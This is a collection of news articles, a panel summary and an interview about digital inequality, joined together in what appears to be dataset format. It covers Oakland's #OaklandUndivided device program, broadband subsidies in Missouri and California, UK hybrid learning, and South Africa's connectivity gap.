But a solution to the problem will be expensive. The initial infrastructure investment could cost $200 million to $300 million. Making broadband available to low-income families might cost at least $45 million in annual subsidies, plus an initial investment of more than $20 million in devices.

The report suggested school districts, libraries and community organizations need to partner to address the problem. Libraries already provide internet access, devices and even training in digital literacy and technology.

“I definitely think that libraries are positioned to assist the community with the educational component and how to use the technology,” Sorth said.

Hundreds of millions of dollars is available in federal funding to address these issues, from the American Rescue Plan Act and the Infrastructure Investment and Jobs Act. That money is set aside for the entire state, but Sorth hopes lawmakers will pay attention to this report’s findings.

“Rural Missouri struggles with internet access and reliable internet access the exact same way that parts of St. Louis County and St. Louis city are suffering,” Sorth said. “We just have to make sure that the state and some of our decision-makers know that we've all got the same issues. So let's come up with a solution that benefits everybody.”",Digital Inequality,2022-04-14 07:00:00

Ramos, used to texting quickly, was able to do simple assignments online, so at first her schoolwork was very easy. Then came the five-page papers for her two AP classes. “It was a hassle,” she said. “I was like, this is not for me.”

Ramos’ parents promised to buy her a laptop eventually, but bills mounted and it wasn’t in the family’s budget. Ramos knew there were many kids like her, eager to keep up with school but lacking the technology to do so. To her, it was “heartbreaking.”

“We have this huge digital divide that’s making it hard for [students] to get their education,” she said.

At the start of the pandemic, only 12 percent of low-income students, and 25 percent of all students, in Oakland’s public schools had devices at home and a strong internet connection. David Silver, the director of education for the mayor’s office, said people talked about the digital divide, but there had never been enough energy to tackle it. Once the pandemic hit, suddenly everyone was paying attention, said Silver, a former Oakland public school teacher and principal.

“You don’t have a computer, you don’t have internet, you can’t even access distance learning,” Silver said. “The 50,000 kids that are in Oakland public schools cannot actually go to school if they don’t have internet and computers. We need to change that.”

Now, two years into the pandemic, Oakland has been able to connect 98 percent of the students in the district. As of February, the city had provided nearly 36,000 laptops and more than 11,500 hot spots to low-income public school students. While some students remain unconnected, Oakland’s effort has emerged as an example of how to tackle a citywide digital divide.

“We were using the crisis as an opportunity to address a moral wrong that needs to be changed forever, not just during the pandemic,” Oakland Mayor Libby Schaaf said. “We can’t afford not to.”

City leaders, including Mayor Schaaf, say a partnership among the district, the mayor’s office, the Oakland Public Education Fund, the nonprofit Tech Exchange, Oakland Promise and other community-based organizations is behind Oakland’s success. Oakland’s partnership, known as #OaklandUndivided, launched in May 2020. The ambitious goal: close the city’s digital divide for good by providing all K-12 public school students in Oakland with a computer they could keep, a reliable internet connection and ongoing, multicultural tech support in languages families use.

“Each of these partners were doing their individual work, but we had never been working together,” Mayor Schaaf said. “That’s what Covid inspired us to do to really accelerate — not just having computers be at schools, but having them in the homes. Not just so students could keep learning during the shutdown, but so that the whole family had access to information and resources.”

“We [didn’t] want this to be a Band-Aid fix,” said Jordan Mickens, a Leadership for Educational Equity public policy fellow who served as #OaklandUndivided’s project manager until August 2021.

Oakland has been able to connect 98 percent of the students in the district.

While most schools across the country are fully back in person, students continue to struggle to complete homework assignments or participate in remote learning because they lack adequate internet service and access to a computer at home — a phenomenon commonly referred to as the “homework gap.” According to a 2021 report from the think tank New America, 1 in 8 children from low-income families don’t have a computer at home, while 1 in 7 lack access to broadband internet.

“The homework gap isn’t new. It’s just been exacerbated by the pandemic,” said Rebeca Shackleford, the director of federal government relations at All4Ed, an education advocacy nonprofit. “There’s kids who sit in McDonald’s parking lots to be able to do their homework, and that’s pretty tragic.”

People have to remember “the pandemic isn’t over,” she said. Disruptions will continue when students have to quarantine after classmates test positive for Covid-19. Natural disasters, exacerbated by climate change, are also shuttering schools with more frequency. When schools are closed, she said, students “still have to do their schoolwork; they still need access to the internet at home.”

efore the pandemic, the digital divide was often considered a rural problem. But the chaotic effort to get students online during Covid school closures made clear the issue affects Americans living in all kinds of places. A recent study from EducationSuperHighway, a nonprofit that works with school districts to help close the digital divide, found that affordability was the largest contributing factor.

Though only about 40 miles north of Silicon Valley, home to technology giants such as Google and Apple, Oakland was deeply underconnected when the pandemic shuttered its schools. When the Oakland Unified School District (OUSD) shut down, its 83 district-run schools and 33 charter schools served more than 49,000 students. Kyla Johnson-Trammell, Oakland’s superintendent, said the first couple of months of the pandemic were a scramble.

“It was all hands on deck. We piecemealed as much as we could in March and April 2020,” she said. Still, she added, there were “just so many stories of kids using their cellphones to complete assignments, to research, or having to figure out how to get to public libraries in order to access devices.”

The district handed out its existing stockpile of loaner devices and hot spots to as many students as possible, said Preston Thomas, OUSD’s chief systems and services officer.

Many of the devices were already 4 to 5 years old. Because the district had been under significant financial pressures for the five years prior to the pandemic, “we hadn’t really invested in our infrastructure around technology,” Thomas said.

The district lacked a system for tracking how many students weren’t logging on to classes for lack of a working computer, tablet or internet connection at home. “We didn’t even have infrastructure on tracking devices,” Thomas said. The district relied on individual schools to call families, while its department of research, assessment and data conducted surveys at individual school sites to find out whether families had an internet connection and computer access.

“Nothing was coordinated,” Thomas said. “Everybody was on the ground doing their absolute best to make sure that kids had access to technology, but it was piecemeal.”

Just before the pandemic, OUSD had begun to identify tech leads at each school, mostly teachers with technology know-how. Once the pandemic hit, the district created the position of distance learning lead, tasked with making sure all students had computers and hot spots. It helped, Thomas said, that these educators “had technological understanding at their school sites, had the ear of teachers at the school site, and could communicate for their community.”

Jen Bender is an instructional teacher leader and technology coordinator at Castlemont High School, in a historically under-resourced neighborhood in East Oakland. Helping the school with its technology needs had been only a small part of her job before the pandemic. In April 2020, Bender stepped in as the school’s distance learning lead, and finding devices for students became her full-time role.

Bender was fortunate in that many Castlemont students already had school devices when the pandemic hit. Still, by the end of that April, she had handed out every last device on campus, even hunting down lost Chromebooks in the process, and some students, including new immigrant students, were still empty-handed.

In the beginning, schools asked students to come get a device if they didn’t have one. But public transportation was disrupted as the state began to shelter in place, and some students and parents had no way to get to school. Other students’ family members were essential workers who couldn’t make it to school during the school day. The newcomers who didn’t speak English were the hardest to reach.

“We realized we had to start really targeting families,” Bender said. The district pulled in community workers who spoke Spanish and Mam, a Mayan language, and “had them make individual phone calls to families to get them to come in and pick up those devices.”

Bender said calling didn’t always help, especially if a family was moving or in temporary housing. School leaders sent teachers and staff members with computers to students’ homes. Even then, Bender said, they had “very little success, because addresses had shifted.”

As May arrived, district administrators realized that relying on the distance learning leads to understand what was happening on the ground was insufficient, Thomas said. “We didn’t have a centralized way to track devices for students,” he said. “Like, we had no idea. Every school had their individual Google spreadsheet, and there wasn’t a unifying place where any of us could look.”

“This is truly a once-in-a-generation moment to close the digital divide and one that has united our city.” Patrick Messac, #OaklandUndivided project manager

District leaders knew they couldn’t confront a problem as massive as the digital divide in Oakland on their own; they were already stretched thin addressing students’ other basic needs, including rising food insecurity.

Johnson-Trammell, the superintendent, and Mayor Schaaf had several conversations about how to tackle technology access and connectivity. As the pandemic unfolded, city officials also saw how deeply the lack of technology access impacted all of Oakland. Almost every resource and piece of information about Covid-19, including where to get food and how to apply for unemployment benefits, was being provided digitally.

“All the information was on the internet. And I imagined, for a minute, what a mother must feel like who didn’t have an internet connection or a computer,” Mayor Schaaf said. “It was so much bigger than just education. It was literally survival for Oakland families. Technology was the lifeline to information.”

Jordan Mickens, who spent his first year as a teacher at Castlemont High School in 2014, said he vividly remembers the technology divide his students faced compared with those in the wealthy areas surrounding Oakland. In 2017, he left teaching to work in education technology at Clever, a digital platform for schools. But soon after the pandemic started, the crisis in schools drew him back to working more directly to support students in Oakland, and he became a public policy fellow on the mayor’s education team.

Silver and Thomas had been working to help Johnson-Trammell and Mayor Schaaf come up with an idea for getting a better handle on the communities left out of remote learning: by tapping into the relationships the city and the school district had with various community-based nonprofits already providing direct services in the neighborhoods they needed to reach. Mickens jumped at the opportunity to come on board when the city hired him to run the new #OaklandUndivided initiative to close the digital divide in June 2020.

The first thing the group did, Mickens said, was to start tracking the number of public school students in Oakland who already had a device and internet service, and those who didn’t. In August 2020, they launched a “Tech Check” survey to collect that data. The new survey was created to be more comprehensive than the initial individual school-led surveys, and made a point of not relying on yes or no questions. The survey asked families if all students at home had devices of their own; whether those devices were loans from a school or family-owned; and whether the family was connected to the internet and, if so, how: via broadband, mobile phone or otherwise.

By May 2021, the campaign had accounted for roughly 70 percent of all Oakland public school students through the survey. Going in, the #OaklandUndivided team had anticipated about 25,000 students would need devices, internet or both, based on the earlier school surveys and census data. The Tech Check survey “opened our eyes,” Mickens said.

Based on the survey results, #OaklandUndivided estimated that 75 percent of K-12 public school students, or almost 40,000, were either disconnected or underconnected, with inadequate internet access.

As another part of the information-gathering effort, #OaklandUndivided tapped into data from the online learning platforms schools were using — Google Classroom and Clever — to see which students were logging in through a computer or mobile phone to access online resources. By October 2020, the district had created a public-facing tech access dashboard to track student access to computers and broadband, and also make the campaign’s effort more transparent to the community and funders, according to Mickens.

Meanwhile, the #OaklandUndivided leadership team, made up of staff employed by multiple agencies in the partnership, met weekly and launched a fundraising campaign with a goal of $12.5 million to provide the initial devices and hot spots. The campaign was able to bring in big donors like Twitter’s co-founder and then CEO Jack Dorsey, who pledged $10 million to help meet the goal. As funding came in, the next step was to buy the Chromebooks and hot spots. There the campaign relied on Tech Exchange, an Oakland-based nonprofit that has been working on closing the city’s digital divide for more than two decades.

The organization has a warehouse and a public-facing Tech Hub that provides residents with free tech support and computer and digital literacy training, as well as refurbishment services. It also offers training on site at public housing complexes. Tech Exchange trains people from the surrounding communities; hires locals to provide its tech services; and hosts interns from Oakland high schools, who sometimes come back to work for the organization.

Tech Exchange’s role was to put in orders for the devices and get the equipment ready for students. By March 16, 2021 — a year after school closures in Oakland — the partnership had handed out 25,000 Chromebooks to low-income students.

Mickens said distributing the devices — which students could keep permanently — was an experience he will never forget. When he taught at Castlemont in 2014, the school had only one Chromebook cart. “To go from that, to now giving every student their own computer … was incredible to be a part of,” he said.

Tech Exchange became an essential partner in not only getting the devices, but also providing the “culturally competent” tech support that had been promised as part of the #OaklandUndivided mission. Tech Exchange was the “secret sauce” of the initiative, Mickens said.

RELATED: A parent-led effort to close the digital divide

In July 2020, the #OaklandUndivided campaign team brought in more community-based organizations, including the Latino Education Network and the Oakland branch of the NAACP. It also added parent and student liaisons who would have a voice in the leadership of the project. High school students including Jessica Ramos, who was recruited by David Silver, her former principal, were invited as student liaisons to help with engagement efforts.

“Community-based organizations, those folks … really have the relationships [with] the Latino/Latina community, the Yemeni community, the African American community,” Johnson-Trammell said. “Typically, without that level of partnership, it’s hard for us as a district to really make sure we’re getting and serving the needs of the most vulnerable.”

The Oakland Reach, a parent-led advocacy group that works with underserved communities, also joined the partnership. Keta Brown, a co-founder of the group, eventually became co-chair of #OaklandUndivided’s family engagement team. The team got the word out about the new initiative and also helped the coalition identify weak points, including engaging with Black parents.

One of those parents was Bernadette Fenceroy, who has four children in Oakland public schools. Early in the pandemic, they relied on one loaner device and a hot spot that worked sporadically. No one got much learning done, she said.

“It is hard when you have some kids that are on the phone and you can’t get all your information,” Fenceroy said. “And a lot of times [my child] has tutoring. You can’t do it on your phone and have to do it on a laptop or a desktop.”

Fenceroy, who met Brown through the Oakland Reach, had a hard time getting support from her kids’ schools for remote learning during the first year of the pandemic. Brown told her to take the Tech Check survey to see if her family qualified for free devices.

When Fenceroy finally got the call in May 2021 saying her kids’ permanent laptops were ready to be picked up, she almost couldn’t believe it. She took a picture of one device and called Brown: “I think I got it! I think I got the computer.”

Although her kids have devices now, Fenceroy hopes the district and #OaklandUndivided’s members don’t “just drop the ball,” she said. She wants them to stay in touch, make sure the devices are working and let parents know who to call for help if they’re not.

At 10 o’clock on a bright Wednesday morning in May 2021, the blinds were still down at Tech Exchange’s Tech Hub, housed in a small office sandwiched between an apartment complex and an appliance store in Oakland. But inside, Samuel Aristondo, then Tech Exchange’s bilingual program coordinator, and two colleagues were already fixing devices and taking calls for tech support.

Aristondo spent more than an hour on the phone talking with a Spanish-speaking family new to the city, walking them through the Tech Check survey to get their free laptops. After he got off the phone, Aristondo still had a list of 300 to 400 students’ families to call. A majority of the families on the list who still remained unconnected were like the one Aristondo reached: They’d been in the U.S. for only a few weeks. Some weren’t aware their kids could get a free device or, if they had a device, didn’t understand how to log on to Google Classroom or use Zoom.

Aristondo, who is now Tech Hub’s operations manager, understands how hard it can be for some of these families, he said. He grew up in foster care after his parents were deported, and he was a first-generation college student. After he’s finished helping connect families with technology, he always asks them if they know where to get free food and medical help. “It’s more than just tech support,” he said.

“That is the secret of how to get folks connected. It’s not just blanketing devices and internet. It’s social work.” Seth Hubbert, the former executive director of Tech Exchange

Since the launch of #OaklandUndivided, the Tech Hub office has been busier than usual, helping students, families and even teachers with their #OaklandUndivided devices. Tech Exchange employees have answered more than 10,000 tech support calls from community members in various languages, according to Mickens.

At 16, Kemish Rosales learned how to fix computers as an intern at Tech Exchange. He has worked there since graduating from nearby Fremont High School in 2013 and is now the Tech Hub coordinator​ for the nonprofit. Seeing kids’ smiles when he gives them computers, or the relief on a worried parent’s face when he answers a question, is why he’s never left this job, he said.

“We know the community, we are part of that community,” Rosales said. “We’re all local. That gives us a better understanding of who we’re helping.”

Tech Exchange employees like Rosales have been key to building trust and reaching out to some of the city’s Spanish-speaking community. Seth Hubbert, the former executive director of Tech Exchange, said it’s been critical to make sure that when partners reach out to families, they do so with language and culture in mind.

“That is the secret of how to get folks connected,” Hubbert said. “It’s not just blanketing devices and internet. It’s social work.”

Parents, especially those who may be undocumented, feel comfortable coming to Tech Exchange for help because “it gives them an ease of mind to [hear] familiar voices and [see] familiar faces,” said Rosales, who is a participant in the Deferred Action for Childhood Arrivals (DACA) program.

The #OaklandUndivided project has evolved since its inception. With an influx of federal funding available to schools in response to the pandemic, Oakland is using the opportunity to strengthen the program. The district received nearly $130 million from the Elementary and Secondary School Emergency Relief (ESSER) Fund, in addition to money from the Emergency Connectivity Fund (ECF), a federal program that has helped schools and libraries provide internet access and connected devices to students and educators during the pandemic.

But those federal funds come with parameters. All the #OaklandUndivided devices handed out in the early days of the pandemic were permanent gifts to families; officials said this was important because a district-managed device has restrictions on its use. A permanent device could be useful to parents trying to access online resources or pursuing their own educations, or it could follow a student on to college.

The federal ESSER and ECF programs require that any device purchased be owned by the school or the district. So, since Aug. 1 of 2021, all the #OaklandUndivided devices going out have been loaners. While the district-lent devices will stay with the student for up to five years, the #OaklandUndivided initiative is still trying to keep its promise of providing permanent devices.

“Recognizing the importance of students owning a computer, we are working with Tech Exchange this year to distribute 4,800 refurbished computers to families who have no owned computer,” said Patrick Messac, the current #OaklandUndivided project manager.

The federal funding itself isn’t permanent. The ECF funding, which was originally set to expire this June, has recently been extended until June 30, 2023. The ESSR funds expire in 2024. Kyleigh Nevis, the devices and operations lead for #OaklandUndivided and OUSD, said the Oakland program is planning for the future and may, for example, switch students on hot-spot plans over to T-Mobile’s Project 10Million, a national program providing free internet to underserved student households.

As of January, the #OaklandUndivided team said, 35,960 families of public school students had received a Chromebook or hot spot or both. Two percent of low-income students remain unconnected. Getting to them will be hard.

For those still “missing,” the district has made a push this year to focus on what it calls high-priority students: those most at risk and with the greatest need, and whom the program still hasn’t been able to reach. The coalition launched a simplified paper-based Tech Check survey, which is integrated into the back-to-school enrollment process. Students can also fill out the survey in class, to make it easier for families.

Messac said he and others on the team are working with the schools’ data tech leads — as the distance learning leads are now called — to identify those students through updated school rosters and call them.

“We’re just trying to find creative solutions to reach these hardest-to-reach students,” Messac said. As of December, the district had surveyed 6,953 students and handed out an additional 5,835 Chromebooks.

Truancy remains one of the main barriers in reaching out to those missing students, Messac said. Bender, data tech lead at Castlemont High School, has found it challenging to assess the home connectivity of some students because they aren’t coming to school often, or at all. The district’s office of digital equity and OUSD’s tech equity and access action team, created in 2020, have also been working to figure out why these students aren’t able to attend classes and connect them.

The Oakland district is currently facing a financial crisis, and John Sasaki, director of communications for OUSD, said it plans to close two schools. Although #OaklandUndivided is a separate program run in partnership with the city that doesn’t rely entirely on funding from the district, the closings could complicate efforts down the road to reach out to students who aren’t connected yet. Messac said the program is working with the district to ensure that if students at the impacted school sites need digital access, those resources will be provided.

As the #OaklandUndivided project enters a new phase, the focus is on building infrastructure to support citywide connectivity by bringing high-speed broadband internet within five years to the estimated 36,951 unconnected households, whether or not they have children in the schools.

“It’s this goal that we believe is absolutely critical to closing the digital divide for good,” Messac said. Oakland launched OAK Wi-Fi, a broadband program, in late 2020 using $7.7 million from CARES Act funding. The program provides residents living in the most underconnected areas with free access to Wi-Fi across the city. In another local effort, the recently launched Town Link program will also improve access to digital literacy; and Oakland is getting help from the state to expand broadband infrastructure.

“This is truly a once-in-a-generation moment to close the digital divide and one that has united our city,” Messac said. “It’s going to take a lot of effort at the state and federal level as well, but our coalition will be active until we bring broadband to all of our families.”

#OaklandUndivided is also partnering with national nonprofits. In November, EducationSuperHighway announced that Oakland was the inaugural pilot city for its nationwide initiative to close the affordability gap. The partnership is deploying free Wi-Fi in low-income apartment buildings.

“Oakland has done a terrific job creating a public-private partnership to connect their unconnected,” said Evan Marwell, EducationSuperHighway’s CEO. “That was really an effective thing for a lot of students. It hasn’t been a perfect solution, but was a best-in-class effort [from] around the country.”

Jessica Ramos is now a freshman at the University of California, Berkeley, which provided her with a new laptop when she started classes. While immersed in college, meeting people and learning more about herself, she still makes time for Oakland. Ramos sits on the #OaklandUndivided leadership committee and helps connect students and their families to both the internet and the program. Watching the project grow “has been amazing,” she said.

Ramos wants other cities to use #OaklandUndivided’s model and expand on it to tackle the homework gap.

“With the pandemic, we all saw what we didn’t want to see. With the digital divide, it’s like one of the things that we think [is] so small, but in reality affects so many people,” said Ramos. “That’s what the pandemic brought, a light to all these problems that need to be solved.”

Panelists explored the impact of the COVID-19 pandemic, the role of the private sector and the opportunities for closing the gap.

Here are some of the key quotes from the session.

The World Economic Forum's latest Agenda Dialogues looked at the challenge of closing the digital divide and ensuring equitable access to the opportunities that internet connectivity affords.

Taking part were: Paula Ingabire, Minister of Information and communications technology and Innovation of Rwanda; Omar bin Sultan Al Olama, Minister of State for Artificial Intelligence, Digital Economy and Remote Work Application of the United Arab Emirates; Achim Steiner, Administrator, United Nations Development Programme; Tan Hooi Ling, Co-Founder, Grab; Robert F. Smith, Founder, Chairman and Chief Executive Officer, Vista Equity Partners; Adrian Lovett, President and Chief Executive Officer, World Wide Web Foundation.

The session was chaired by Børge Brende, President, World Economic Forum, and moderated by Adrian Monck, Managing Director, World Economic Forum.

COVID-19 a 'catalyst' for digital transition

The COVID-19 pandemic has accelerated the digital transition, all the panelists agreed. As Paula Ingabire explained, it's been a 'catalyst' for digital transformation in many countries - both in fighting the pandemic and using digital tools to ensure essential services could continue.

But a digital divide and disparities persist, she added, and the current pace of digital adoption is exaggerating this divide.

And while technology helped tackle many of the challenges thrown up by the pandemic, there are broader issues still to tackle, explained Omar bin Sultan Al Olama. It's not enough to just give a child a tablet - you need to ensure their learning environment is appropriate, he said.

Access, in spite of the acceleration we've seen during the pandemic, remains a major hurdle though, the panel agreed.

A whole-society approach

Inclusion needs to be at the centre of the digital transformation, urged Achim Steiner. You need to consider society as a whole, he said. You need to build digital ecosystems that work for start-ups, for entrepreneurs, for coders and programmers, but also ensure people aren't left behind.

Connection alone isn't enough. Steiner asks: How can we build education systems that will allow young people to thrive in digital economies?

And meaningful connections are important, urged Ingabire and Adrian Lovett. It's not binary said Lovett - whether you're connected or not - it's about ensuring people have infrastructure they can rely on and a connection they can access regularly.

digital, COVID-19, EDISON Alliance EDISON Alliance: What is the Forum doing to close the digital gap? COVID-19 has exposed digital inequities globally and exacerbated the digital divide. Most of the world lives in areas covered by a mobile broadband network, yet more than one-third (2.9 billion people) are still offline. Cost, not coverage, is the barrier to connectivity. At The Davos Agenda 2021, the World Economic Forum launched the EDISON Alliance, the first cross-sector alliance to accelerate digital inclusion and connect critical sectors of the economy. Through the 1 Billion Lives Challenge, the EDISON Alliance aims to improve 1 billion lives globally through affordable and accessible digital solutions across healthcare, financial services and education by 2025. Read more about the EDISON Alliance’s work in our Impact Story.



The potential of closing the gap

There are enormous opportunities if we can close the divide, from education to employment. There's 'massive economic impact' in uplifting communities, if we can take advantage, summarized Robert F. Smith.

And as Lovett explained, the returns on investment are significant - we just need the resources.

Digital technology also helped those who suffered the disruption caused by the pandemic, said Tan Hooi Ling. Her technology company Grab was able to offer a lifeline to many who had seen other forms of income disappear, she said.

""The economics of this works,"" summarized Al Olama. We just need people to understand the potential and to encourage the public and private sector to work together to convince investors.

The role of public-private partnerships

The panelists were united on the need for collaboration between the private and public sectors - and civil society, added Lovett.

The involvement of the private sector is already driving progress in the United States, explained Smith. There are already various initiatives underway to improve connectivity in communities around the country. And it's important that US businesses are encouraged to engage with the public sector.

This is true across the world, explained Tan. As a social enterprise, Grab asks itself how can it work together with other companies and with governments to create products and services that are really needed.

A ""unified effort"" is needed from the public and private sectors, believes Al Olama.

It's not a question of how one is better than the other, concluded Steiner. It's a question of how one can enable the other.

The COVID-19 pandemic has heightened the need for universal broadband access. Without reliable high-speed internet, it is difficult for students to attend online classes and for parents to work at home.

Many California households struggle to afford internet services, particularly in low-income communities and communities of color. To help bridge this digital divide, the federal government established the Emergency Broadband Benefit (EBB) program last May.

The program offers a subsidy of up to $50 per month toward broadband service for eligible households—those earning up to 135% of the federal poverty level (or about $35,000 for a family of four) or who qualify for other federal safety net programs.

The recently enacted Infrastructure Investment and Jobs Act extends the Emergency Broadband Benefit program indefinitely, with a subsidy of $30 per month. However, preliminary data show that the program is not reaching many eligible households. Nationwide, only about one in five eligible households were enrolled as of October 31. This means that 26 million eligible households are not receiving the subsidy.

California’s 24% take-up rate—the percentage of households enrolled in the program out of all eligible households—is slightly higher than other large, diverse states, such as Florida (22%), New York (21%), and Texas (19%). However, only 9 of California’s 58 counties have take-up rates above 50%, and its median county take-up rate is only 27%. Take-up rate varies widely across counties: it is only 8% in Marin, Nevada, and Sierra counties, while it is effectively 100% in Imperial County and quite high in Merced (84%) and Kern (77%) counties.

Although these low rates are cause for concern, counties with higher poverty rates tend to have higher Emergency Broadband Benefit participation. This correlation is promising because the increased access to the internet in high-poverty counties could boost those local economies.

Moreover, populous counties with high poverty rates are more likely to have larger shares of households enrolled in the Emergency Broadband Benefit program than do smaller counties with similar poverty rates. This indicates that the number of participating households statewide is probably higher than the take-up percentages alone suggest. For example, Los Angeles County has a 46% take-up rate, while the take-up rate is lower in smaller counties with similar poverty rates—such as Santa Barbara (26%) and Yolo (22%).

Several factors contribute to the low take-up rate. First, awareness is very low: nationwide, only 23% of adults have heard “a lot” or “some” about the Emergency Broadband Benefit program. Second, many households may be discouraged by the multi-step application process, which requires them to first apply to the government and then arrange for a participating internet service provider to apply the subsidy. Third, some internet service providers initially required enrollees to upgrade their existing data plans to more expensive plans, so some households may have decided not to apply for fear of higher bills if they become ineligible or if the program ends.

There are several ways to improve the Emergency Broadband Benefit program:

Use existing networks and systems to boost awareness . Federal, state and local governments could work with community-based organizations—trusted messengers in historically marginalized communities—to raise awareness. They could also explore ways to automatically notify and/or enroll eligible households through the Federal Communications Commission’s current subsidy program, other safety-net programs and school lunch programs.

Streamline the application process and service delivery. Leveraging existing data, resources and information pathways could simplify enrollment. The pandemic-EBT card, used to supplement household food budgets, is a model for delivering much-needed support that households can use with any participating internet service provider.

Limiting household broadband costs to a percentage of income. The Emergency Broadband Benefit subsidy does not cover all broadband costs, which average $68/month nationwide and may increase with newer technology. Policymakers could consider replicating the design of existing housing subsidy programs, which cover costs above a percentage of household income.

Closing the digital divide is critical to improving educational and economic opportunity. While the state recently approved investments intended to narrow this divide in the long term, short-term strategies such as the Emergency Broadband Benefit are also needed to address current gaps.",Digital Inequality,2022-01-04 08:00:00

While in most cases, the poorest in society were hit the hardest, digital inequality impacted all demographics and segments of society. The lockdowns brought to light the scale of the problem and the urgency with which it needs addressing.

As I write this post, schools across the country are closed due to severe weather warnings: disruption seems the new way of life, and it is critical that we do all that we can to help close this gap permanently, to ensure an inclusive education for all.

Having discussed the issue at length with my industry peers and university customers, here are my key thoughts and observations on the subject so far…

Hybrid learning is in danger of creating a ‘proximity bias’

Historically, the campus has been the great leveller, but virtual learning has created new complexities. While many institutions have encouraged students back to campus this academic year, some universities have noted that students choosing not to attend are at danger of becoming marginalised.

Ultimately, students need to be given choice in where and when they would like to study, with the reassurance that everyone will receive an equal experience. Much of this comes down to training and culture. Remote learning and flexible timetables have the benefit of accommodating students with jobs, and those who are full-time parents or carers; as well as offering improved accessibility for mature students and students with disabilities; not to mention the environmental benefits such as a reduction in carbon emissions from daily commuter traffic. With hybrid learning here to stay, it is critical that universities and colleges are mindful of segregation, or proximity bias, not occurring.

Laptop loans are only a temporary solution

Over the short term, academic institutions have dealt with the digital inequality issue by loaning laptops to students and extending access to data and connectivity, but there is industry consensus that this is no permanent fix.

One UK university, for example, purchased 600 laptops, but required an additional government top-up as they had only managed to reach a fifth of their student body. Furthermore, the logistics of handing out thousands of laptops has proven tricky, along with the added challenge of retrieving them once they are no longer needed. Universities around the country have had to write off hundreds of ‘lost’ laptops over the past couple of years, with many doubtful over how much they were used for learning purposes.

Trials with low-cost, low-power devices have also proven unpopular with students. Ultimately, a better long-term solution is needed.

University staff need upskilling in active blended-learning technologies

Until recently, digital competence has rarely been a job requirement for teaching staff in FE and HE. Rather, it is common for lecturers and professors to have held their tenure for many years, and technology may often bear no relation to their field of competence. However, throughout the pandemic, teaching staff have shown incredible agility and tenacity, having to adapt very quickly, delivering remote learning in unprecedented ways, under extreme pressure.

Now that the dust has settled, FE institutions must focus on upskilling their staff properly, in the technologies that support active blended learning. The universities I have spoken to are anticipating some push-back and believe a cultural and mindset shift is needed. Lecturers and professors must summon the desire to become more digitally competent, so that they can deliver a level playing field for all. Looking ahead it seems likely that new teaching hires will need to demonstrate the same basic digital skills that are required in industry.

Every student needs a safe and quiet place to study

The pandemic exposed many different levels of deprivation, and while having access to the right technology and device is critical to learning, having a safe place to study is of equal importance. Virtual learning exacerbated the digital inequality position, because where learners had access to data and a safe place to learn, they were able to participate; but where there were other issues, such as a difficult living situation, those individuals fell behind.

Over the past year, universities have found themselves needing to create more safe spaces for students to study on-site, and in many cases, this means repurposing exiting teaching rooms and spaces. One UK university, for example, had to sacrifice its entire library to create a collaborative workspace where students can bring their laptops to learn and study virtually.

Finding a solution…

While we can begin to tackle the issue of digital inequality from an IT angle, it is important to recognise that this is not just an IT issue, but rather one that sits across the whole of academia, from primary through to higher education, permeating every corner of the country.

Digital inequality is truly one of the biggest issues facing universities and colleges, and as life begins to return to ‘normal’ and restrictions end, it is crucial that stakeholders come together and collaborate, and share learnings with one another, so that a permanent solution can be found. Education is a basic human right, and we must do all that we can to preserve this.

South Africa’s injustices are now feeding a relatively new form of disparity, that is, digital inequality. Digital access and literacy may be far from the mind of the person reading this very article on our website or app, but for many in South Africa, it is a harsh reality that is increasing the country’s inequality gap.

According to Dudu Mkhwanazi of Project Isizwe, a social enterprise that aims to provide low-income communities with affordable access to wifi, 7.5 million low-income South Africans are paying 80 times more than middle- and upper-income citizens for access to the internet, exacerbating inequality in the country.

South Africa’s digital divide can be broken down into three factors: access to hardware, understanding digital means of communication, and internet affordability. These factors are having a negative impact on two of the country’s best chances at development and equality, those being access to education and access to employment opportunities.

The pandemic has made matters worse in both spaces, with 2.2 million people in the country having lost their jobs as a result COVID-19’s impact on the economy, and an estimated 750,000 children having dropped out of school because of a lack of access to remote education. Access to education and providing job opportunities have the ability to reduce South Africa’s large inequality gap, however with most things moving online, citizens could miss out on both.

In order to understand how digital inequality affects the most vulnerable people, we spoke to two experts. First we reached out to Dr Moeti Kgware, lecturer at the Durban University of Technology and Chief Education Officer at education consultancy and training organisation, MoCPD, to find out how the digital divide is impacting education in South Africa.

We also spoke to business consultant and lecturer at the University of Cape Town, Rowan Spazzoli, who shed some light on how digital illiteracy and lack of access affects the search for employment in the country.

To what extent do you believe the digital divide is increasing the education inequality gap in the country?

Moeti Kgware (MK): Working at a university I realised that, just the equipment — we’re talking data, we’re talking electronics — the majority of students don’t have access to this equipment. That’s laptops, smartphones, or if they do have, they’re not the top of the range smartphones that can be able to accommodate the amount of data or information that they have to either get, or produce for us. Secondly is the actual access through data or wifi is a problem. When students are in Durban at the university, coming from rural places they have access to the internet. When they leave campus, we at the university still continue to be digital, but the places where they are, they don’t have access to coverage for their phones, or quality phones at all. That leads to a lot of students lagging behind.

What are some first-hand encounters you've experienced that indicated the need to bridge South Africa's digital divide?

MK: In the past year I’ve been lecturing research methodology to a group of advanced students, and some of them I never saw. COVID-19 hit us just as I began teaching them, so I spent a year teaching online. I had a class of 88, but at no time did I have more than 32 in that class. I had to record some of my lessons and send them over to students, but some of them could never access them. Just to give you an example, they would use those R400 - R500 (approximately $30) affordable smartphones, the ones where you have to delete a picture to be able to save a new one — can you imagine a lecture of two hours being sent to that? They wouldn’t be able to access them.

Recently, I had an assignment where I wanted them to record videos, a short clip of two minutes. Out of a class of 25, I only received five because when what happened in KwaZulu Natal happened, [civil unrest and looting across the province] most of the students went back home, and only those who were left on campus were able to send videos because of access to wifi, the rest couldn’t.

What has the digital divide done for the success rate of students?

MK: I eventually got a 60% pass rate last year, but I can really say that if it had been a face-to-face class or if I was teaching them, I wouldn’t have set the kind of assessments that I did. I won’t say I made them easy, but what they had, I can’t compare it to the year before [pre-COVID], where I was able to stand in front of them and teach them very difficult and in-depth things. The success rate was not so good, and even the ones who passed, I don’t think they’ll be able to, currently as it stands, stand up and say confidently “I know how to do research because of being in this class.” They might have to go through some sort of refresher when things get better or when they have better access to information.

Are there actions being taken by the university or the government to improve access to digital means?

MK: The university really does try. They have made access for a lot of students, the ones who are on NSFAS (the National Student Financial Aid Scheme) and those who are low-income but unable to get NSFAS, have been given some form of loans or bursaries to get laptops, and they provide data to the students. The issue becomes where the students live. If they were on campus everything would be fine, but they’re in places where they don’t necessarily have access to internet coverage and that’s basically a problem of the country and not necessarily of the institution itself.

What can the country do to improve digital access?

